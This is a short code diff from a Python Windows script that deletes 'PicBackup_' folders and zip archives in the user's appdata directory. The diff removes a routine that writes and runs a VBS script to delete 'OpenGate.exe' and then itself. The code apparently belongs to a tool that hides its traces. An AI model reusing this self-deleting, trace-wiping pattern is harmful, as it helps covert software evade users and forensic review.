@@ -147,14 +147,7 @@ class WIN_Geat:
             shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=True, onerror=None)    
             os.remove(os.environ["appdata"] +'\\PicBackup_'+str(f'{d}')+'.zip')  
             d +=1 
-        with open(os.getcwd()+'\\Delete_self.vbs','w')  as vbs:
-             vbs.write(
-                       "dim filesys"+'\n'
-                       'Set filesys = CreateObject("Scripting.FileSystemObject")'+'\n'
-                       'filesys.DeleteFile ".\\OpenGate.exe"'+"\n"
-                       'filesys.DeleteFile ".\\Delete_self.vbs"'+"\n"
-                     ) 
-        os.system(os.getcwd()+'\\Delete_self.vbs')    
+            
 if __name__=='__main__':
     WIN_Geat()
 
